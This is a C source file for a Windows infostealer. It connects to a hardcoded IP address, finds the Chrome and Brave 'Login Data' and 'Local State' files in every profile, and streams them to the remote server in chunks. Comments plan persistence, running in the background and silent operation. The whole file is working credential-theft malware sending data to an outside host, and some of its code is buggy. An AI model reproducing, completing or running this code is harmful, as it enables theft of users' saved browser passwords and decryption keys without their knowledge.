#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <shlobj.h>
#include "socketFunctions.h"
#define IP "86.14.182.215"
#define PORT 8080
#define BRAVE "\\BraveSoftware\\Brave-Browser\\User Data"
#define CHROME "\\Google\\Chrome\\User Data"
#define OPERA "Opera Software\\Opera Stable"
#define FIREFOX "\\"

int getPathsInArray(char** paths)
{
    int arrayIndex = 0;
    int size = 0;
    int reachedEndOfArray = 0;

    while (!reachedEndOfArray)
    {
        char *arrayStr;
        memcpy(arrayStr, paths[arrayIndex], 3);
        printf("%s\n", arrayStr);
        if (memcmp(arrayStr, "\0\0\0", 3)) return size;
        arrayIndex++;
        size += 256;
    }
}

char** catBrowserPaths(char** dest, char** source)
{
    if ((int)source[0][0] == 0) return dest;

    printf("Cat browser paths\n");
    dest = realloc(dest, sizeof(char *) * (3 + (int)dest[0][0] + (int)source[0][0]));
    //memcpy(dest + sizeof(char *) * (dest[0][0] + 2), source + sizeof(char *) * 2, sizeof(char *) * (int)source[0][0]);
    for (int i = 0; i < source[0][0] + 1; i++)
    {
        dest[dest[0][0] + 2 + i] = source[1 + i];
    }

    dest[0][0] += source[0][0] + 1; // The number of paths in the array including the browser name
    printf("Paths in new array: %d\n", dest[0][0]);
    return dest;
}

/// @brief Checks if file exists, reallocates array and appends path at the last position leaving 32 bytes of space at the start for the file name
/// @param paths 
/// @param path 
/// @return 
char** checkForFilePathAndAppendToArrayIfExists(char** paths, char* path)
{
    if (!access(path, F_OK)) // TODO Put file check in a function
    {
        paths = realloc(paths, sizeof(char *) * (paths[0][0] + 3)); // Allocate more space to array to insert another path into array. The additional space allocated is due to array information stored at the start
        if (paths == NULL) printf("Could not realloc\n");
        printf("Realloc\n");
        paths[paths[0][0] + 2] = malloc(256);
        strcpy(paths[paths[0][0] + 2] + 32, path);
        
        printf("Found: %s\n", paths[paths[0][0] + 2] + 32);

        paths[0][0] += 1;
        printf("Paths: %d\n", paths[0][0]);
        return paths;
    }


    return 0;
}

/// @brief Checks if a profile exists and appends the profile login data file to the paths array along with a file name
/// @param paths Paths array
/// @param path Path to browser user data directory
/// @param profile Name of profile directory to check for
/// @return 
char** checkForProfileAndAppendToArrayIfExists(char** paths, char* path, char* profile)
{
    // Path of login data file to look for
    strcat(path, "\\");
    strcat(path, profile);
    strcat(path, "\\Login Data"); // Now there is a full path to the login data of the current profile being checked

    char** val;

    if ((val = checkForFilePathAndAppendToArrayIfExists(paths, path)))
    {
        paths = val;
        strcpy(paths[paths[0][0]+1], profile);
        strcat(paths[paths[0][0]+1], " Login Data ");
        return paths;
    }

    return 0;
}

/// @brief Returns a pointer to an array of strings of size 256 bytes containing the full paths to each browser profile's login data
/// @param path Path to the User Data folder of browser
/// @return 
char** getLoginDataPathsForBrowser(char* path, char* browser)
{
    // Honestly fuck this shit I already spent 8 hours on this today. Gonna count the number of paths first and then create an array. Fuck this.
    // Have I ever told you what the definition of insanity is?
    char **profilePaths = malloc(sizeof(char *) * 3); // Have to allocate enough space for pointers to character arrays containing the total paths, browser name and default path, then reallocate for more paths
    profilePaths[0] = malloc(sizeof(int)); // Number of paths in array
    profilePaths[1] = malloc(32); // Browser name
    profilePaths[0][0] = 0; // Why does it work like that?
    strcpy(profilePaths[1], "browser: ");
    strcat(profilePaths[1], browser); // TODO Why does it only work with strcpy?
    char profilePath[256];
    char localStatePath[256];
    char profile[16];
    int paths = 0;
    int profileIndex = 1;
    int profileExists = 1;
    char** val;
    
    // Check for login data in Default folder
    // TODO Put into function so that default is checked with the rest of the paths
    strcpy(profile, "Default");
    strcpy(profilePath, path);
    printf("Checking if Default exists in %s\n", profilePath);
    if ((val = checkForProfileAndAppendToArrayIfExists(profilePaths, profilePath, profile)))
    {
        profilePaths = val;
        paths++;
        printf("Profile %s found\n", profile);
    }

    // Check for login data in folders starting with Profile
    while (profileExists)
    {
        strcpy(profilePath, "\0"); // Clear path
        strcpy(profilePath, path);
        strcpy(profile, "\0");
        strcpy(profile, "Profile ");

        // Path of login data file to look for 
        char profileIndexStr[8];
        sprintf(profileIndexStr, "%d", profileIndex);
        strcat(profile, profileIndexStr);
        
        // Check if login data file exists
        printf("Checking if %s exists in %s\n", profile, profilePath);
        if ((val = checkForProfileAndAppendToArrayIfExists(profilePaths, profilePath, profile)))
        {
            profilePaths = val;
            paths++;
            profileIndex++;
            
            printf("Profile %s found\n", profile);
        } else profileExists = 0;
    }

    strcpy(localStatePath, path);
    strcat(localStatePath, "\\Local State");

    if ((val = checkForFilePathAndAppendToArrayIfExists(profilePaths, localStatePath)))
    {
        profilePaths = val;
        strcpy(profilePaths[profilePaths[0][0]+1], "Local State ");
    }

    return profilePaths;
}

int main(int argc, char* argv[])
{
    int socket, valread, client_fd;
    struct sockaddr_in serv_addr;
    char* hello = "Hello from client";
    char buffer[1024] = { 0 };
    
    initialize(&client_fd, &serv_addr, 0);

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    if (inet_pton(AF_INET, IP, &serv_addr.sin_addr) <= 0)
    {
        printf("IP address error");
        return -1;
    }

    if ((socket = connect(client_fd, (struct sockaddr*)&serv_addr, sizeof(serv_addr))))
    {
        printf("Connect error");
        printf("Connect socket: %d %d\n", socket, WSAGetLastError());
        return -1;
    }

    handleSendResult(send(client_fd, hello, strlen(hello), 0), &client_fd, &socket);
    printf("Hello message sent\n");
    valread = recv(client_fd, buffer, 1024, 0);
    printf("Message received: %s\n", buffer);

    FILE *fp;
    int fileSize;
    char appdata[256];
    SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata);
    printf("%s\n", appdata);
    // TODO Run on startup
    // TODO Run in background
    // TODO Always try to connect to server
    // TODO Print messages only in debug mode
    char path[256];
    strcpy(path, appdata);
    strcat(path, CHROME);
    char **browserPaths = getLoginDataPathsForBrowser(path, "Chrome");
    strcpy(path, appdata);
    strcat(path, BRAVE);
    browserPaths = catBrowserPaths(browserPaths, getLoginDataPathsForBrowser(path, "Brave"));
    
    char browser[32];

    for (int i = 0; i < (int)browserPaths[0][0]; i++)
    {
        // Browser name
        if (!strncmp(browserPaths[i+2], "browser: ", strlen("browser: "))) // The current array index contains the browser name
        {
            printf("%s\n", browserPaths[i+2]);
            strcpy(browser, browserPaths[i+2] + strlen("browser: "));
            continue;
        } else if (!strcmp(browser, "")) strcpy(browser, browserPaths[1] + strlen("browser: ")); // The browser variable is empty

        printf("Sending %s file %s\n", browser, browserPaths[i+2] + 32);

        fp = fopen(browserPaths[i+2] + 32, "rb");

        // Handle missing file.
        if (fp == NULL) 
        {
            printf("Missing file\n");
            continue; 
        }

        fseek(fp, 0L, SEEK_END);
        fileSize = ftell(fp); // Get file size
        char fileBuffer[fileSize];
        fseek(fp, 0L, SEEK_SET); // Set the seek to the start of the file
        printf("Login data file size: %d\n", fileSize);
        fread(fileBuffer, 1, fileSize, fp);
        fclose(fp);

        int code = 1;

        char fileName[32];
        char fileSizeStr[16];
        char codeStr[16];
        ltoa(fileSize, fileSizeStr, 10);
        ltoa(code, codeStr, 10);
        printf("Opcode: %s\n", codeStr);
        Sleep(100);
        handleSendResult(send(client_fd, codeStr, strlen(codeStr), 0), &client_fd, &socket); // Send the opcode
        Sleep(100);
        
        strcpy(fileName, browser);
        strcat(fileName, " ");
        strcat(fileName, browserPaths[i+2]);
        printf("File name: %s\n", fileName);
        handleSendResult(send(client_fd, fileName, 32, 0), &client_fd, &socket); // Send file name. If strlen is used and the string is less than 32 bytes, the server reads random characters into the buffer as it expects 32 bytes
        Sleep(100);
        handleSendResult(send(client_fd, fileSizeStr, strlen(fileSizeStr), 0), &client_fd, &socket); // Send the file size
        Sleep(100);
        // Send file in chunks of 1024 bytes
        int dataSent = 0;
        int bufferSize = 4096;
        while (dataSent < fileSize)
        {
            char fileBufferToSend[4096];
            memcpy(fileBufferToSend, fileBuffer + dataSent, bufferSize);
            handleSendResult(send(client_fd, fileBufferToSend, bufferSize, 0), &client_fd, &socket); // Send the file contents
            printf("Send file buffer position %-10d start byte 0x%-10x end byte 0x%-10x\n", dataSent, fileBufferToSend[0], fileBufferToSend[bufferSize-1]);
            //printf("Send file buffer position %-10d start byte 0x%-10x end byte 0x%-10x\n", dataSent, fileBuffer[dataSent], fileBuffer[dataSent + bufferSize]);
            dataSent += bufferSize;
            Sleep(100); // Sleep to not break the file by sending it too fast
        }
    }

    int entriesInPathsArray = browserPaths[0][0] + 2;

    for (int i = 0; i < entriesInPathsArray; i++)
    {
        free(browserPaths[i]);
    }

    free(browserPaths);
    closeSocket(&client_fd, &socket);
    return 0;
}